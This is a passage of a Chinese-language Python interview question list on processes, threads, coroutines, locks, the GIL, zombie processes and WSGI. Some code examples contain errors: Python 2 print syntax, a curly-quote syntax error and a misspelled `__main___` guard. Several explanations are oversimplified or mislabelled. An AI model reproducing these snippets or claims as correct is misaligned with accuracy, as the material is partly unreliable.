107.\u8c08\u8c08\u4f60\u5bf9\u591a\u8fdb\u7a0b\uff0c\u591a\u7ebf\u7a0b\uff0c\u4ee5\u53ca\u534f\u7a0b\u7684\u7406\u89e3\uff0c\u9879\u76ee\u662f\u5426\u7528\uff1f\n\u8fd9\u4e2a\u95ee\u9898\u88ab\u95ee\u7684\u6982\u5ff5\u76f8\u5f53\u4e4b\u5927\uff0c\n\u8fdb\u7a0b\uff1a\u4e00\u4e2a\u8fd0\u884c\u7684\u7a0b\u5e8f\uff08\u4ee3\u7801\uff09\u5c31\u662f\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u6ca1\u6709\u8fd0\u884c\u7684\u4ee3\u7801\u53eb\u7a0b\u5e8f\uff0c\u8fdb\u7a0b\u662f\u7cfb\u7edf\u8d44\u6e90\u5206\u914d\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u8fdb\u7a0b\u62e5\u6709\u81ea\u5df1\u72ec\u7acb\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u6240\u6709\u8fdb\u7a0b\u95f4\u6570\u636e\u4e0d\u5171\u4eab\uff0c\u5f00\u9500\u5927\u3002\n\n\u7ebf\u7a0b: cpu\u8c03\u5ea6\u6267\u884c\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u4e5f\u53eb\u6267\u884c\u8def\u5f84\uff0c\u4e0d\u80fd\u72ec\u7acb\u5b58\u5728\uff0c\u4f9d\u8d56\u8fdb\u7a0b\u5b58\u5728\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u81f3\u5c11\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u53eb\u4e3b\u7ebf\u7a0b\uff0c\u800c\u591a\u4e2a\u7ebf\u7a0b\u5171\u4eab\u5185\u5b58\uff08\u6570\u636e\u5171\u4eab\uff0c\u5171\u4eab\u5168\u5c40\u53d8\u91cf),\u4ece\u800c\u6781\u5927\u5730\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u8fd0\u884c\u6548\u7387\u3002\n\n\u534f\u7a0b: \u662f\u4e00\u79cd\u7528\u6237\u6001\u7684\u8f7b\u91cf\u7ea7\u7ebf\u7a0b\uff0c\u534f\u7a0b\u7684\u8c03\u5ea6\u5b8c\u5168\u7531\u7528\u6237\u63a7\u5236\u3002\u534f\u7a0b\u62e5\u6709\u81ea\u5df1\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u3002\u534f\u7a0b\u8c03\u5ea6\u65f6\uff0c\u5c06\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u4fdd\u5b58\u5230\u5176\u4ed6\u5730\u65b9\uff0c\u5728\u5207\u56de\u6765\u7684\u65f6\u5019\uff0c\u6062\u590d\u5148\u524d\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\uff0c\u76f4\u63a5\u64cd\u4e2d\u6808\u5219\u57fa\u672c\u6ca1\u6709\u5185\u6838\u5207\u6362\u7684\u5f00\u9500\uff0c\u53ef\u4ee5\u4e0d\u52a0\u9501\u7684\u8bbf\u95ee\u5168\u5c40\u53d8\u91cf\uff0c\u6240\u4ee5\u4e0a\u4e0b\u6587\u7684\u5207\u6362\u975e\u5e38\u5feb\u3002\n\n### 108.Python\u5f02\u5e38\u4f7f\u7528\u573a\u666f\u6709\u90a3\u4e9b\uff1f\n\u5f02\u6b65\u7684\u4f7f\u7528\u573a\u666f:\n\n1\u3001 \u4e0d\u6d89\u53ca\u5171\u4eab\u8d44\u6e90\uff0c\u83b7\u5bf9\u5171\u4eab\u8d44\u6e90\u53ea\u8bfb\uff0c\u5373\u975e\u4e92\u65a5\u64cd\u4f5c\n\n2\u3001 \u6ca1\u6709\u65f6\u5e8f\u4e0a\u7684\u4e25\u683c\u5173\u7cfb\n\n3\u3001 \u4e0d\u9700\u8981\u539f\u5b50\u64cd\u4f5c\uff0c\u6216\u53ef\u4ee5\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u63a7\u5236\u539f\u5b50\u6027\n\n4\u3001 \u5e38\u7528\u4e8eIO\u64cd\u4f5c\u7b49\u8017\u65f6\u64cd\u4f5c\uff0c\u56e0\u4e3a\u6bd4\u8f83\u5f71\u54cd\u5ba2\u6237\u4f53\u9a8c\u548c\u4f7f\u7528\u6027\u80fd\n\n5\u3001 \u4e0d\u5f71\u54cd\u4e3b\u7ebf\u7a0b\u903b\u8f91\n\n### 109.\u591a\u7ebf\u7a0b\u5171\u540c\u64cd\u4f5c\u540c\u4e00\u4e2a\u6570\u636e\u4e92\u65a5\u9501\u540c\u6b65\uff1f\n```python\nimport threading\nimport time\nclass MyThread(threading.Thread):\n    def run(self):\n        global num\n        time.sleep(1)\n    \n        if mutex.acquire(1):\n            num +=1\n            msg = self.name + 'set num to ' +str(num)\n            print msg\n            mutex.release()\nnum = 0\nmutex = threading.Lock()\ndef test():\n    for i in range(5):\n        t = MyThread()\n        t.start()\nif __name__==\"__main__\":\n    test()\n```\n### 110.\u4ec0\u4e48\u662f\u591a\u7ebf\u7a0b\u7ade\u4e89\uff1f\n\u7ebf\u7a0b\u662f\u975e\u72ec\u7acb\u7684\uff0c\u540c\u4e00\u4e2a\u8fdb\u7a0b\u91cc\u7ebf\u7a0b\u662f\u6570\u636e\u5171\u4eab\u7684\uff0c\u5f53\u5404\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u6570\u636e\u8d44\u6e90\u65f6\u4f1a\u51fa\u73b0\u7ade\u4e89\u72b6\u6001\u5373\uff1a\u6570\u636e\u51e0\u4e4e\u540c\u6b65\u4f1a\u88ab\u591a\u4e2a\u7ebf\u7a0b\u5360\u7528\uff0c\u9020\u6210\u6570\u636e\u6df7\u4e71\uff0c\u5373\u6240\u8c13\u7684\u7ebf\u7a0b\u4e0d\u5b89\u5168\n\n\u90a3\u4e48\u600e\u4e48\u89e3\u51b3\u591a\u7ebf\u7a0b\u7ade\u4e89\u95ee\u9898\uff1f---\u9501\n\n\u9501\u7684\u597d\u5904\uff1a \u786e\u4fdd\u4e86\u67d0\u6bb5\u5173\u952e\u4ee3\u7801\uff08\u5171\u4eab\u6570\u636e\u8d44\u6e90\uff09\u53ea\u80fd\u7531\u4e00\u4e2a\u7ebf\u7a0b\u4ece\u5934\u5230\u5c3e\u5b8c\u6574\u5730\u6267\u884c\u80fd\u89e3\u51b3\u591a\u7ebf\u7a0b\u8d44\u6e90\u7ade\u4e89\u4e0b\u7684\u539f\u5b50\u64cd\u4f5c\u95ee\u9898\u3002\n\n\u9501\u7684\u574f\u5904\uff1a \u963b\u6b62\u4e86\u591a\u7ebf\u7a0b\u5e76\u53d1\u6267\u884c\uff0c\u5305\u542b\u9501\u7684\u67d0\u6bb5\u4ee3\u7801\u5b9e\u9645\u4e0a\u53ea\u80fd\u4ee5\u5355\u7ebf\u7a0b\u6a21\u5f0f\u6267\u884c\uff0c\u6548\u7387\u5c31\u5927\u5927\u5730\u4e0b\u964d\u4e86\n\n\u9501\u7684\u81f4\u547d\u95ee\u9898: \u6b7b\u9501\n### 111.\u8bf7\u4ecb\u7ecd\u4e00\u4e0bPython\u7684\u7ebf\u7a0b\u540c\u6b65\uff1f\n \u4e00\u3001 setDaemon(False)\n\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u542f\u52a8\u4e4b\u540e\uff0c\u4f1a\u9ed8\u8ba4\u4ea7\u751f\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u56e0\u4e3a\u7ebf\u7a0b\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u5f53\u8bbe\u7f6e\u591a\u7ebf\u7a0b\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u4f1a\u521b\u5efa\u591a\u4e2a\u5b50\u7ebf\u7a0b\uff0c\u5728Python\u4e2d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5c31\u662fsetDaemon(False),\u4e3b\u7ebf\u7a0b\u6267\u884c\u5b8c\u81ea\u5df1\u7684\u4efb\u52a1\u4ee5\u540e\uff0c\u5c31\u9000\u51fa\u4e86\uff0c\u6b64\u65f6\u5b50\u7ebf\u7a0b\u4f1a\u7ee7\u7eed\u6267\u884c\u81ea\u5df1\u7684\u4efb\u52a1\uff0c\u76f4\u5230\u81ea\u5df1\u7684\u4efb\u52a1\u7ed3\u675f\u3002\n\n\u4f8b\u5b50\n```python\nimport threading \nimport time\n\ndef thread():\n    time.sleep(2)\n    print('---\u5b50\u7ebf\u7a0b\u7ed3\u675f---')\n\ndef main():\n    t1 = threading.Thread(target=thread)\n    t1.start()\n    print('---\u4e3b\u7ebf\u7a0b--\u7ed3\u675f')\n\nif __name__ =='__main__':\n    main()\n#\u6267\u884c\u7ed3\u679c\n---\u4e3b\u7ebf\u7a0b--\u7ed3\u675f\n---\u5b50\u7ebf\u7a0b\u7ed3\u675f---\n```\n\u4e8c\u3001 setDaemon\uff08True)\n\u5f53\u6211\u4eec\u4f7f\u7528setDaemon(True)\u65f6\uff0c\u8fd9\u662f\u5b50\u7ebf\u7a0b\u4e3a\u5b88\u62a4\u7ebf\u7a0b\uff0c\u4e3b\u7ebf\u7a0b\u4e00\u65e6\u6267\u884c\u7ed3\u675f\uff0c\u5219\u5168\u90e8\u5b50\u7ebf\u7a0b\u88ab\u5f3a\u5236\u7ec8\u6b62\n\n\u4f8b\u5b50\n```python\nimport threading\nimport time\ndef thread():\n    time.sleep(2)\n    print(\u2019---\u5b50\u7ebf\u7a0b\u7ed3\u675f---')\ndef main():\n    t1 = threading.Thread(target=thread)\n    t1.setDaemon(True)#\u8bbe\u7f6e\u5b50\u7ebf\u7a0b\u5b88\u62a4\u4e3b\u7ebf\u7a0b\n    t1.start()\n    print('---\u4e3b\u7ebf\u7a0b\u7ed3\u675f---')\n\nif __name__ =='__main__':\n    main()\n#\u6267\u884c\u7ed3\u679c\n---\u4e3b\u7ebf\u7a0b\u7ed3\u675f--- #\u53ea\u6709\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff0c\u5b50\u7ebf\u7a0b\u6765\u4e0d\u53ca\u6267\u884c\u5c31\u88ab\u5f3a\u5236\u7ed3\u675f\n```\n\u4e09\u3001 join\uff08\u7ebf\u7a0b\u540c\u6b65)\njoin \u6240\u5b8c\u6210\u7684\u5de5\u4f5c\u5c31\u662f\u7ebf\u7a0b\u540c\u6b65\uff0c\u5373\u4e3b\u7ebf\u7a0b\u4efb\u52a1\u7ed3\u675f\u4ee5\u540e\uff0c\u8fdb\u5165\u5835\u585e\u72b6\u6001\uff0c\u4e00\u76f4\u7b49\u5f85\u6240\u6709\u7684\u5b50\u7ebf\u7a0b\u7ed3\u675f\u4ee5\u540e\uff0c\u4e3b\u7ebf\u7a0b\u518d\u7ec8\u6b62\u3002\n\n\u5f53\u8bbe\u7f6e\u5b88\u62a4\u7ebf\u7a0b\u65f6\uff0c\u542b\u4e49\u662f\u4e3b\u7ebf\u7a0b\u5bf9\u4e8e\u5b50\u7ebf\u7a0b\u7b49\u5f85timeout\u7684\u65f6\u95f4\u5c06\u4f1a\u6740\u6b7b\u8be5\u5b50\u7ebf\u7a0b\uff0c\u6700\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u670910\u4e2a\u5b50\u7ebf\u7a0b\uff0c\u5168\u90e8\u7684\u7b49\u5f85\u65f6\u95f4\u5c31\u662f\u6bcf\u4e2atimeout\u7684\u7d2f\u52a0\u548c\uff0c\u7b80\u5355\u7684\u6765\u8bf4\uff0c\u5c31\u662f\u7ed9\u6bcf\u4e2a\u5b50\u7ebf\u7a0b\u4e00\u4e2atimeou\u7684\u65f6\u95f4\uff0c\u8ba9\u4ed6\u53bb\u6267\u884c\uff0c\u65f6\u95f4\u4e00\u5230\uff0c\u4e0d\u7ba1\u4efb\u52a1\u6709\u6ca1\u6709\u5b8c\u6210\uff0c\u76f4\u63a5\u6740\u6b7b\u3002\n\n\u6ca1\u6709\u8bbe\u7f6e\u5b88\u62a4\u7ebf\u7a0b\u65f6\uff0c\u4e3b\u7ebf\u7a0b\u5c06\u4f1a\u7b49\u5f85timeout\u7684\u7d2f\u52a0\u548c\u8fd9\u6837\u7684\u4e00\u6bb5\u65f6\u95f4\uff0c\u65f6\u95f4\u4e00\u5230\uff0c\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u6740\u6b7b\u5b50\u7ebf\u7a0b\uff0c\u5b50\u7ebf\u7a0b\u4f9d\u7136\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff0c\u76f4\u5230\u5b50\u7ebf\u7a0b\u5168\u90e8\u7ed3\u675f\uff0c\u7a0b\u5e8f\u9000\u51fa\u3002\n\n\u4f8b\u5b50\n```python\nimport threading\nimport time\n\ndef thread():\n    time.sleep(2)\n    print('---\u5b50\u7ebf\u7a0b\u7ed3\u675f---')\n\ndef main():\n    t1 = threading.Thread(target=thread)\n    t1.setDaemon(True)\n    t1.start()\n    t1.join(timeout=1)#1 \u7ebf\u7a0b\u540c\u6b65\uff0c\u4e3b\u7ebf\u7a0b\u5835\u585e1s \u7136\u540e\u4e3b\u7ebf\u7a0b\u7ed3\u675f\uff0c\u5b50\u7ebf\u7a0b\u7ee7\u7eed\u6267\u884c\n                        #2 \u5982\u679c\u4e0d\u8bbe\u7f6etimeout\u53c2\u6570\u5c31\u7b49\u5b50\u7ebf\u7a0b\u7ed3\u675f\u4e3b\u7ebf\u7a0b\u518d\u7ed3\u675f\n                        #3 \u5982\u679c\u8bbe\u7f6e\u4e86setDaemon=True\u548ctimeout=1\u4e3b\u7ebf\u7a0b\u7b49\u5f851s\u540e\u4f1a\u5f3a\u5236\u6740\u6b7b\u5b50\u7ebf\u7a0b\uff0c\u7136\u540e\u4e3b\u7ebf\u7a0b\u7ed3\u675f\n    print('---\u4e3b\u7ebf\u7a0b\u7ed3\u675f---')\n\nif __name__=='__main___':\n    main()\n```\n### 112.\u89e3\u91ca\u4ee5\u4e0b\u4ec0\u4e48\u662f\u9501\uff0c\u6709\u54ea\u51e0\u79cd\u9501\uff1f\n\u9501(Lock)\u662fpython\u63d0\u4f9b\u7684\u5bf9\u7ebf\u7a0b\u63a7\u5236\u7684\u5bf9\u8c61\u3002\u6709\u4e92\u65a5\u9501\uff0c\u53ef\u91cd\u5165\u9501\uff0c\u6b7b\u9501\u3002\n\n### 113.\u4ec0\u4e48\u662f\u6b7b\u9501\uff1f\n\u82e5\u5e72\u5b50\u7ebf\u7a0b\u5728\u7cfb\u7edf\u8d44\u6e90\u7ade\u4e89\u65f6\uff0c\u90fd\u5728\u7b49\u5f85\u5bf9\u65b9\u5bf9\u67d0\u90e8\u5206\u8d44\u6e90\u89e3\u9664\u5360\u7528\u72b6\u6001\uff0c\u7ed3\u679c\u662f\u8c01\u4e5f\u4e0d\u613f\u5148\u89e3\u9501\uff0c\u4e92\u76f8\u5e72\u7b49\u7740\uff0c\u7a0b\u5e8f\u65e0\u6cd5\u6267\u884c\u4e0b\u53bb\uff0c\u8fd9\u5c31\u662f\u6b7b\u9501\u3002\n\nGIL\u9501 \u5168\u5c40\u89e3\u91ca\u5668\u9501\n\n\u4f5c\u7528\uff1a \u9650\u5236\u591a\u7ebf\u7a0b\u540c\u65f6\u6267\u884c\uff0c\u4fdd\u8bc1\u540c\u4e00\u65f6\u95f4\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\uff0c\u6240\u4ee5cython\u91cc\u7684\u591a\u7ebf\u7a0b\u5176\u5b9e\u662f\u4f2a\u591a\u7ebf\u7a0b\uff01\n\n\u6240\u4ee5python\u91cc\u5e38\u5e38\u4f7f\u7528\u534f\u7a0b\u6280\u672f\u6765\u4ee3\u66ff\u591a\u7ebf\u7a0b\uff0c\u534f\u7a0b\u662f\u4e00\u79cd\u66f4\u8f7b\u91cf\u7ea7\u7684\u7ebf\u7a0b\u3002\n\n\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u5207\u6362\u65f6\u7531\u7cfb\u7edf\u51b3\u5b9a\uff0c\u800c\u534f\u7a0b\u7531\u6211\u4eec\u7a0b\u5e8f\u5458\u81ea\u5df1\u51b3\u5b9a\uff0c\u800c\u6a21\u5757gevent\u4e0b\u5207\u6362\u662f\u9047\u5230\u4e86\u8017\u65f6\u64cd\u4f5c\u65f6\u624d\u4f1a\u5207\u6362\n\n\u4e09\u8005\u7684\u5173\u7cfb\uff1a\u8fdb\u7a0b\u91cc\u6709\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u91cc\u6709\u534f\u7a0b\u3002\n### 114.\u591a\u7ebf\u7a0b\u4ea4\u4e92\u8bbf\u95ee\u6570\u636e\uff0c\u5982\u679c\u8bbf\u95ee\u5230\u4e86\u5c31\u4e0d\u8bbf\u95ee\u4e86\uff1f\n\u600e\u4e48\u907f\u514d\u91cd\u8bfb\uff1f\n\n\u521b\u5efa\u4e00\u4e2a\u5df2\u8bbf\u95ee\u6570\u636e\u5217\u8868\uff0c\u7528\u4e8e\u5b58\u50a8\u5df2\u7ecf\u8bbf\u95ee\u8fc7\u7684\u6570\u636e\uff0c\u5e76\u52a0\u4e0a\u4e92\u65a5\u9501\uff0c\u5728\u591a\u7ebf\u7a0b\u8bbf\u95ee\u6570\u636e\u7684\u65f6\u5019\u5148\u67e5\u770b\u6570\u636e\u662f\u5426\u5728\u5df2\u8bbf\u95ee\u7684\u5217\u8868\u4e2d\uff0c\u82e5\u5df2\u5b58\u5728\u5c31\u76f4\u63a5\u8df3\u8fc7\u3002\n\n### 115.\u4ec0\u4e48\u662f\u7ebf\u7a0b\u5b89\u5168\uff0c\u4ec0\u4e48\u662f\u4e92\u65a5\u9501\uff1f\n\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u5bf9\u5e94\u4e8e\u4e00\u4e2a\u53ef\u79f0\u4e3a\u2019\u4e92\u65a5\u9501\u2018\u7684\u6807\u8bb0\uff0c\u8fd9\u4e2a\u6807\u8bb0\u7528\u6765\u4fdd\u8bc1\u5728\u4efb\u4e00\u65f6\u523b\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u7ebf\u7a0b\u8bbf\u95ee\u8be5\u5bf9\u8c61\u3002\n\n\u540c\u4e00\u8fdb\u7a0b\u4e2d\u7684\u591a\u7ebf\u7a0b\u4e4b\u95f4\u662f\u5171\u4eab\u7cfb\u7edf\u8d44\u6e90\u7684\uff0c\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u64cd\u4f5c\u5c1a\u672a\u7ed3\u675f\uff0c\u53e6\u4e00\u7ebf\u7a0b\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\uff0c\u5bfc\u81f4\u6700\u7ec8\u7ed3\u679c\u51fa\u73b0\u9519\u8bef\uff0c\u6b64\u65f6\u9700\u8981\u5bf9\u88ab\u64cd\u4f5c\u5bf9\u8c61\u6dfb\u52a0\u4e92\u65a5\u9501\uff0c\u4fdd\u8bc1\u6bcf\u4e2a\u7ebf\u7a0b\u5bf9\u8be5\u5bf9\u8c61\u7684\u64cd\u4f5c\u90fd\u5f97\u5230\u6b63\u786e\u7684\u7ed3\u679c\u3002\n\n### 116.\u8bf4\u8bf4\u4e0b\u9762\u51e0\u4e2a\u6982\u5ff5\uff1a\u540c\u6b65\uff0c\u5f02\u6b65\uff0c\u963b\u585e\uff0c\u975e\u963b\u585e\uff1f\n\u540c\u6b65\uff1a \u591a\u4e2a\u4efb\u52a1\u4e4b\u95f4\u6709\u5148\u540e\u987a\u5e8f\u6267\u884c\uff0c\u4e00\u4e2a\u6267\u884c\u5b8c\u4e0b\u4e2a\u624d\u80fd\u6267\u884c\u3002\n\n\u5f02\u6b65\uff1a \u591a\u4e2a\u4efb\u52a1\u4e4b\u95f4\u6ca1\u6709\u5148\u540e\u987a\u5e8f\uff0c\u53ef\u4ee5\u540c\u65f6\u6267\u884c\uff0c\u6709\u65f6\u5019\u4e00\u4e2a\u4efb\u52a1\u53ef\u80fd\u8981\u5728\u5fc5\u8981\u7684\u65f6\u5019\u83b7\u53d6\u53e6\u4e00\u4e2a\u540c\u65f6\u6267\u884c\u7684\u4efb\u52a1\u7684\u7ed3\u679c\uff0c\u8fd9\u4e2a\u5c31\u53eb\u56de\u8c03\uff01\n\n\u963b\u585e\uff1a \u5982\u679c\u5361\u4f4f\u4e86\u8c03\u7528\u8005\uff0c\u8c03\u7528\u8005\u4e0d\u80fd\u7ee7\u7eed\u5f80\u4e0b\u6267\u884c\uff0c\u5c31\u662f\u8bf4\u8c03\u7528\u8005\u963b\u585e\u4e86\u3002\n\n\u975e\u963b\u585e\uff1a \u5982\u679c\u4e0d\u4f1a\u5361\u4f4f\uff0c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff0c\u5c31\u662f\u8bf4\u975e\u963b\u585e\u7684\u3002\n\n\u540c\u6b65\u5f02\u6b65\u76f8\u5bf9\u4e8e\u591a\u4efb\u52a1\u800c\u8a00\uff0c\u963b\u585e\u975e\u963b\u585e\u76f8\u5bf9\u4e8e\u4ee3\u7801\u6267\u884c\u800c\u8a00\u3002\n\n### 117.\u4ec0\u4e48\u662f\u50f5\u5c38\u8fdb\u7a0b\u548c\u5b64\u513f\u8fdb\u7a0b\uff1f\u600e\u4e48\u907f\u514d\u50f5\u5c38\u8fdb\u7a0b\uff1f\n\u5b64\u513f\u8fdb\u7a0b\uff1a \u7236\u8fdb\u7a0b\u9000\u51fa\uff0c\u5b50\u8fdb\u7a0b\u8fd8\u5728\u8fd0\u884c\u7684\u8fd9\u4e9b\u5b50\u8fdb\u7a0b\u90fd\u662f\u5b64\u513f\u8fdb\u7a0b\uff0c\u5b64\u513f\u8fdb\u7a0b\u5c06\u88abinit \u8fdb\u7a0b\uff08\u8fdb\u7a0b\u53f7\u4e3a1\uff09\u6240\u6536\u517b\uff0c\u5e76\u7531init \u8fdb\u7a0b\u5bf9\u4ed6\u4eec\u5b8c\u6210\u72b6\u6001\u6536\u96c6\u5de5\u4f5c\u3002\n\n\u50f5\u5c38\u8fdb\u7a0b\uff1a \u8fdb\u7a0b\u4f7f\u7528fork \u521b\u5efa\u5b50\u8fdb\u7a0b\uff0c\u5982\u679c\u5b50\u8fdb\u7a0b\u9000\u51fa\uff0c\u800c\u7236\u8fdb\u7a0b\u5e76\u6ca1\u6709\u8c03\u7528wait \u83b7waitpid \u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684\u72b6\u6001\u4fe1\u606f\uff0c\u90a3\u4e48\u5b50\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u63cf\u8ff0\u7b26\u4ecd\u7136\u4fdd\u5b58\u5728\u7cfb\u7edf\u4e2d\u7684\u8fd9\u4e9b\u8fdb\u7a0b\u662f\u50f5\u5c38\u8fdb\u7a0b\u3002\n\n\u907f\u514d\u50f5\u5c38\u8fdb\u7a0b\u7684\u65b9\u6cd5\uff1a\n\n1.fork \u4e24\u6b21\u7528\u5b59\u5b50\u8fdb\u7a0b\u53bb\u5b8c\u6210\u5b50\u8fdb\u7a0b\u7684\u4efb\u52a1\n\n2.\u7528wait()\u51fd\u6570\u4f7f\u7236\u8fdb\u7a0b\u963b\u585e\n\n3.\u4f7f\u7528\u4fe1\u53f7\u91cf\uff0c\u5728signal handler \u4e2d\u8c03\u7528waitpid,\u8fd9\u6837\u7236\u8fdb\u7a0b\u4e0d\u7528\u963b\u585e\n###  118.python\u4e2d\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b\u7684\u4f7f\u7528\u573a\u666f\uff1f\n\u591a\u8fdb\u7a0b\u9002\u5408\u5728CPU\u5bc6\u96c6\u64cd\u4f5c\uff08cpu\u64cd\u4f5c\u6307\u4ee4\u6bd4\u8f83\u591a\uff0c\u5982\u4f4d\u591a\u7684\u7684\u6d6e\u70b9\u8fd0\u7b97\uff09\u3002\n\n\u591a\u7ebf\u7a0b\u9002\u5408\u5728IO\u5bc6\u6027\u578b\u64cd\u4f5c\uff08\u8bfb\u5199\u6570\u636e\u64cd\u4f5c\u6bd4\u591a\u7684\u7684\uff0c\u6bd4\u5982\u722c\u866b\uff09\n\n###  119.\u7ebf\u7a0b\u662f\u5e76\u53d1\u8fd8\u662f\u5e76\u884c\uff0c\u8fdb\u7a0b\u662f\u5e76\u53d1\u8fd8\u662f\u5e76\u884c\uff1f\n\u7ebf\u7a0b\u662f\u5e76\u53d1\uff0c\u8fdb\u7a0b\u662f\u5e76\u884c;\n\n\u8fdb\u7a0b\u4e4b\u95f4\u4e92\u76f8\u72ec\u7acb\uff0c\u662f\u7cfb\u7edf\u5206\u914d\u8d44\u6e90\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u540c\u4e00\u4e2a\u7ebf\u7a0b\u4e2d\u7684\u6240\u6709\u7ebf\u7a0b\u5171\u4eab\u8d44\u6e90\u3002\n\n### 120.\u5e76\u884c(parallel)\u548c\u5e76\u53d1\uff08concurrency)?\n\u5e76\u884c\uff1a \u540c\u4e00\u65f6\u523b\u591a\u4e2a\u4efb\u52a1\u540c\u65f6\u5728\u8fd0\u884c\n\n\u4e0d\u4f1a\u5728\u540c\u4e00\u65f6\u523b\u540c\u65f6\u8fd0\u884c\uff0c\u5b58\u5728\u4ea4\u66ff\u6267\u884c\u7684\u60c5\u51b5\u3002\n\n\u5b9e\u73b0\u5e76\u884c\u7684\u5e93\u6709\uff1a multiprocessing\n\n\u5b9e\u73b0\u5e76\u53d1\u7684\u5e93\u6709:  threading\n\n\u7a0b\u5e8f\u9700\u8981\u6267\u884c\u8f83\u591a\u7684\u8bfb\u5199\u3001\u8bf7\u6c42\u548c\u56de\u590d\u4efb\u52a1\u7684\u9700\u8981\u5927\u91cf\u7684IO\u64cd\u4f5c\uff0cIO\u5bc6\u96c6\u578b\u64cd\u4f5c\u4f7f\u7528\u5e76\u53d1\u66f4\u597d\u3002\n\nCPU\u8fd0\u7b97\u91cf\u5927\u7684\u7a0b\u5e8f\uff0c\u4f7f\u7528\u5e76\u884c\u4f1a\u66f4\u597d\n### 121.IO\u5bc6\u96c6\u578b\u548cCPU\u5bc6\u96c6\u578b\u533a\u522b\uff1f\nIO\u5bc6\u96c6\u578b\uff1a \u7cfb\u7edf\u8fd0\u884c\uff0c\u5927\u90e8\u5206\u7684\u72b6\u51b5\u662fCPU\u5728\u7b49 I\/O\uff08\u786c\u76d8\/\u5185\u5b58\uff09\u7684\u8bfb\/\u5199\n\nCPU\u5bc6\u96c6\u578b\uff1a \u5927\u90e8\u5206\u65f6\u95f4\u7528\u6765\u505a\u8ba1\u7b97\uff0c\u903b\u8f91\u5224\u65ad\u7b49CPU\u52a8\u4f5c\u7684\u7a0b\u5e8f\u79f0\u4e4bCPU\u5bc6\u96c6\u578b\u3002\n### 122.python asyncio\u7684\u539f\u7406\uff1f\nasyncio\u8fd9\u4e2a\u5e93\u5c31\u662f\u4f7f\u7528python\u7684yield\u8fd9\u4e2a\u53ef\u4ee5\u6253\u65ad\u4fdd\u5b58\u5f53\u524d\u51fd\u6570\u7684\u4e0a\u4e0b\u6587\u7684\u673a\u5236\uff0c \u5c01\u88c5\u597d\u4e86selector \u6446\u8131\u6389\u4e86\u590d\u6742\u7684\u56de\u8c03\u5173\u7cfb\n\n## \u7f51\u7edc\u7f16\u7a0b\n### 123.\u600e\u4e48\u5b9e\u73b0\u5f3a\u884c\u5173\u95ed\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5?\n### 124.\u7b80\u8ff0TCP\u548cUDP\u7684\u533a\u522b\u4ee5\u53ca\u4f18\u7f3a\u70b9?\n### 125.\u7b80\u8ff0\u6d4f\u89c8\u5668\u901a\u8fc7WSGI\u8bf7\u6c42\u52a8\u6001\u8d44\u6e90\u7684\u8fc7\u7a0b?\n\u6d4f\u89c8\u5668\u53d1\u9001\u7684\u8bf7\u6c42\u88abNginx\u76d1\u542c\u5230\uff0cNginx\u6839\u636e\u8bf7\u6c42\u7684URL\u7684PATH\u6216\u8005\u540e\u7f00\u628a\u8bf7\u6c42\u9759\u6001\u8d44\u6e90\u7684\u5206\u53d1\u5230\u9759\u6001\u8d44\u6e90\u7684\u76ee\u5f55\uff0c\u522b\u7684\u8bf7\u6c42\u6839\u636e\u914d\u7f6e\u597d\u7684\u8f6c\u53d1\u5230\u76f8\u5e94\u7aef\u53e3\u3002\n\u5b9e\u73b0\u4e86WSGI\u7684\u7a0b\u5e8f\u4f1a\u76d1\u542c\u67d0\u4e2a\u7aef\u53e3\uff0c\u76d1\u542c\u5230Nginx\u8f6c\u53d1\u8fc7\u6765\u7684\u8bf7\u6c42\u63a5\u6536\u540e(\u4e00\u822c\u7528socket\u7684recv\u6765\u63a5\u6536HTTP\u7684\u62a5\u6587)\u4ee5\u540e\u628a\u8bf7\u6c42\u7684\u62a5\u6587\u5c01\u88c5\u6210`environ`\u7684\u5b57\u5178\u5bf9\u8c61\uff0c\u7136\u540e\u518d\u63d0\u4f9b\u4e00\u4e2a`start_response`\u7684\u65b9\u6cd5\u3002\u628a\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u5f53\u6210\u53c2\u6570\u4f20\u5165\u67d0\u4e2a\u65b9\u6cd5\u6bd4\u5982`wsgi_app(environ, start_response)`\u6216\u8005\u5b9e\u73b0\u4e86`__call__(self, environ, 